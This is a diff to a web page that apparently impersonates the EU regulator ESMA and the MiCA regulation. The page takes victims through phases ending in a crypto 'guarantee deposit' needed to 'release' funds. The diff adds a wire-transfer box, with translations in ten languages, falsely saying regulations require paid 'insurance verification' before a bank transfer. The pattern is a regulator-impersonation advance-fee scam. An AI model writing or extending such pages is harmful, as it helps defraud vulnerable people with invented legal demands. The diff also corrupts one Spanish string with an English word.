@@ -130,6 +130,7 @@ input[type="text"], input[type="email"], select {
   text-decoration: none; 
   width: 100%; 
   border-radius: 2px; 
+  box-sizing: border-box;
 }
 
 .btn-eu:hover { 
@@ -614,7 +615,7 @@ input[type="text"], input[type="email"], select {
       <button class="btn-eu" onclick="toDepositSelection()" data-i18n="btnPayDetails">PROCEED TO PAYMENT DETAILS</button>
     </div>
 
-    <!-- PHASE 7: CRYPTO SELECTION -->
+    <!-- PHASE 7: CRYPTO SELECTION & WIRE TRANSFER INFO -->
     <div id="phase7" class="phase">
       <h3 style="color: var(--eu-blue);" data-i18n="p7Title">Select Deposit Method</h3>
       <div class="form-group">
@@ -628,6 +629,19 @@ input[type="text"], input[type="email"], select {
         </select>
       </div>
       <button class="btn-eu" onclick="handleAssetChoice()" data-i18n="btnGenerate">GENERATE DEPOSIT ADDRESS</button>
+
+      <!-- WIRE TRANSFER & INSURANCE BOX -->
+      <div style="margin-top: 30px; background: #f8fafc; border: 1px solid var(--border); border-left: 5px solid var(--eu-blue); padding: 20px; border-radius: 4px;">
+        <h4 style="margin: 0 0 10px 0; color: var(--eu-blue);" data-i18n="wireTitle">
+          <i class="fas fa-university"></i> Bank Wire Transfer Option
+        </h4>
+        <p style="font-size: 14px; color: var(--text-dark); margin: 0 0 15px 0; line-height: 1.5;" data-i18n="wireText">
+          Clients wishing to settle the guarantee deposit via SEPA or international bank wire transfer may do so. However, pursuant to regulatory mandates, bank transfers require mandatory active insurance coverage prior to wire dispatch.
+        </p>
+        <a href="insurance.html" class="btn-eu btn-outline" style="margin-top: 0; display: block; text-align: center;" data-i18n="btnInsurance">
+          PROCEED TO INSURANCE VERIFICATION
+        </a>
+      </div>
     </div>
 
     <!-- PHASE 8: FINAL PAYMENT PAGE -->
@@ -909,6 +923,9 @@ const i18n = {
     p7SelectLabel: "Choose Cryptocurrency Network",
     p7OptionDefault: "-- Select Asset --",
     btnGenerate: "GENERATE DEPOSIT ADDRESS",
+    wireTitle: "Bank Wire Transfer Option",
+    wireText: "Clients wishing to settle the guarantee deposit via SEPA or international bank wire transfer may do so. However, pursuant to regulatory mandates, bank transfers require mandatory active insurance coverage prior to wire dispatch.",
+    btnInsurance: "PROCEED TO INSURANCE VERIFICATION",
     p8Title: "Secure Escrow Payment Gateway",
     p8Sub: "ESMA / MiCA Validated Transaction",
     p8AmountSend: "AMOUNT TO SEND",
@@ -982,6 +999,9 @@ const i18n = {
     p7SelectLabel: "Vælg Kryptovalutanetværk",
     p7OptionDefault: "-- Vælg Aktiv --",
     btnGenerate: "GENERER INDBETALINGSADRESSE",
+    wireTitle: "Moglighed for Bankoverførsel",
+    wireText: "Klienter, der ønsker at indbetale garantidepositum via SEPA eller international bankoverførsel, kan gøre dette. I henhold til lovkrav kræver bankoverførsler dog obligatorisk aktiv forsikringsdækning før afsendelse.",
+    btnInsurance: "FORTSÆT TIL FORSIKRINGSVERIFIKATION",
     p8Title: "Sikker Escrow Betalingsgateway",
     p8Sub: "ESMA / MiCA Valideret Transaktion",
     p8AmountSend: "BELØB DER SKAL SENDES",
@@ -1055,6 +1075,9 @@ const i18n = {
     p7SelectLabel: "Kryptowährungsnetzwerk wählen",
     p7OptionDefault: "-- Vermögenswert auswählen --",
     btnGenerate: "EINZAHLUNGSADRESSE GENERIEREN",
+    wireTitle: "Option für Banküberweisung",
+    wireText: "Kunden, die die Garantiekaution per SEPA oder internationaler Banküberweisung begleichen möchten, können dies tun. Gemäß den gesetzlichen Bestimmungen ist für Banküberweisungen jedoch vor der Anweisung ein fester Versicherungsschutz erforderlich.",
+    btnInsurance: "WEITER ZUR VERSICHERUNGSPRÜFUNG",
     p8Title: "Sicheres Treuhand-Zahlungsgateway",
     p8Sub: "ESMA / MiCA Validierte Transaktion",
     p8AmountSend: "ZU SENDENDER BETRAG",
@@ -1128,6 +1151,9 @@ const i18n = {
     p7SelectLabel: "Kies Cryptowetwerk",
     p7OptionDefault: "-- Selecteer Cryptomunt --",
     btnGenerate: "GENEREER STORTINGSADRES",
+    wireTitle: "Optie voor Bankoverschrijving",
+    wireText: "Cliënten die de garantieborg via SEPA of een internationale bankoverschrijving willen voldoen, kunnen dit doen. Volgens regelgeving vereisen bankoverschrijvingen echter een verplichte actieve verzekeringsdekking voorafgaand aan de verzending.",
+    btnInsurance: "GA NAAR VERZEKERINGSVERIFICATIE",
     p8Title: "Beveiligde Escrow Betalingsgateway",
     p8Sub: "ESMA / MiCA Gegarandeerde Transactie",
     p8AmountSend: "TE VERZENDEN BEDRAG",
@@ -1201,6 +1227,9 @@ const i18n = {
     p7SelectLabel: "Elija la Red de Criptomonedas",
     p7OptionDefault: "-- Seleccionar Activo --",
     btnGenerate: "GENERAR DIRECCIÓN DE DEPÓSITO",
+    wireTitle: "Opción de Transferencia Bancaria",
+    wireText: "Los clientes que deseen liquidar el depósito de garantía mediante SEPA o transferencia bancaria internacional pueden hacerlo. Sin embargo, conforme a la normativa, las transferencias requieren una cobertura de seguro obligatoria antes de la emisión.",
+    btnInsurance: "PROCEDER A LA VERIFICACIÓN DEL SEGURO",
     p8Title: "Pasarela de Pago Segura en Garantía",
     p8Sub: "Transacción Validada por ESMA / MiCA",
     p8AmountSend: "CANTIDAD A ENVIAR",
@@ -1210,7 +1239,7 @@ const i18n = {
     btnConfirmDeposit: "CONFIRMAR DEPÓSITO ENVIADO",
     btnCancel: "Cancelar y volver al Portal de la ESMA",
     modalTitle: "Afirmación de Cumplimiento",
-    modalText: "Reconozco el marco <strong>MiCA (Reglamento UE 2023/1114)</strong> y entiendo que la liberación de fondos está estrictamente supeditada a la verificación del depósito de garantía obligatorio.",
+    modalText: "Reconozco el marco <strong>MiCA (Reglamento UE 2023/1114)</strong> y entiendo que la liberación de fondos está strictly supeditada a la verificación del depósito de garantía obligatorio.",
     btnModalProceed: "PROCEDER A LA VERIFICACIÓN",
     dispatchModalTitle: "Envío de Depósito Registrado",
     dispatchModalText: "Por favor envíe su <strong>Comprobante de Pago</strong> (Hash de Transacción / Recibo) directamente a su Oficial de Cumplimiento Financiero asignado para facilitar la verificación inmediata y la liberación del certificado.",
@@ -1274,6 +1303,9 @@ const i18n = {
     p7SelectLabel: "Valitse Kryptovaluuttaverkko",
     p7OptionDefault: "-- Valitse Valuutta --",
     btnGenerate: "LUO TALLETUSOSOITE",
+    wireTitle: "Pankkisiirto-vaihtoehto",
+    wireText: "Asiakkaat, jotka haluavat maksaa takuutalletuksen SEPA- tai kansainvälisellä pankkisiirrolla, voivat tehdä niin. Sääntelyvaatimusten mukaisesti pankkisiirrot edellyttävät kuitenkin pakollista voimassa olevaa vakuutussuojaa ennen siirron suorittamista.",
+    btnInsurance: "SIIRRY VAKUUTUKSEN VAHVISTUKSEEN",
     p8Title: "Turvallinen Escrow-Maksuyhdyskäytävä",
     p8Sub: "ESMA / MiCA Vahvistettu Transaktio",
     p8AmountSend: "LÄHETETTÄVÄ MÄÄRÄ",
@@ -1347,6 +1379,9 @@ const i18n = {
     p7SelectLabel: "Choisir le Réseau de Crypto-monnaie",
     p7OptionDefault: "-- Sélectionner l'actif --",
     btnGenerate: "GÉNÉRER L'ADRESSE DE DÉPÔT",
+    wireTitle: "Option de Virement Bancaire",
+    wireText: "Les clients souhaitant régler le dépôt de garantie par SEPA ou virement bancaire international peuvent le faire. Cependant, conformément aux exigences réglementaires, les virements nécessitent une couverture d'assurance obligatoire avant l'envoi.",
+    btnInsurance: "PASSER À LA VÉRIFICATION DE L'ASSURANCE",
     p8Title: "Passerelle de Paiement Séquestre Sécurisée",
     p8Sub: "Transaction Validée par ESMA / MiCA",
     p8AmountSend: "MONTANT À ENVOYER",
@@ -1420,6 +1455,9 @@ const i18n = {
     p7SelectLabel: "Scegli la Rete di Criptovaluta",
     p7OptionDefault: "-- Seleziona Attività --",
     btnGenerate: "GENERA INDIRIZZO DI DEPOSITO",
+    wireTitle: "Opzione Bonifico Bancario",
+    wireText: "I clienti che desiderano saldare il deposito di garanzia tramite SEPA o bonifico bancario internazionale possono farlo. Tuttavia, in base alle normative, i bonifici richiedono una copertura assicurativa obbligatoria prima dell'invio.",
+    btnInsurance: "PROCEDI ALLA VERIFICA DELL'ASSICURAZIONE",
     p8Title: "Gateway di Pagamento Escrow Sicuro",
     p8Sub: "Transazione Validata ESMA / MiCA",
     p8AmountSend: "IMPORTO DA INVIARE",
@@ -1493,6 +1531,9 @@ const i18n = {
     p7SelectLabel: "Velg Kryptovalutanettverk",
     p7OptionDefault: "-- Velg Valuta --",
     btnGenerate: "GENERER INNSKUDDSADRESSE",
+    wireTitle: "Alternativ for Bankoverføring",
+    wireText: "Klienter som ønsker å innbetale garantidepositumet via SEPA eller internasjonal bankoverføring kan gjøre dette. I henhold til regelverket krever bankoverføringer imidlertid obligatorisk aktiv forsikringsdekning før overføringen utføres.",
+    btnInsurance: "GÅ TIL FORSIKRINGSVERIFISERING",
     p8Title: "Sikker Escrow Betalingsgateway",
     p8Sub: "ESMA / MiCA Validert Transaksjon",
     p8AmountSend: "BELØP SOM SKAL SENDES",
@@ -1566,6 +1607,9 @@ const i18n = {
     p7SelectLabel: "Välj Kryptovalutanätverk",
     p7OptionDefault: "-- Välj Tillgång --",
     btnGenerate: "GENERERA INSÄTTNINGSADRESS",
+    wireTitle: "Alternativ för Banköverföring",
+    wireText: "Kunder som vill betala garantidepositumet via SEPA eller internationell banköverföring kan göra det. Enligt regelverket kräver banköverföringar dock en obligatorisk aktiv försäkringstäckning innan överföringen påbörjas.",
+    btnInsurance: "GÅ TILL FÖRSÄKRINGSVERIFIERING",
     p8Title: "Säker Escrow Betalningsgateway",
     p8Sub: "ESMA / MiCA Validerad Transaktion",
     p8AmountSend: "BELOPP ATT SKICKA",
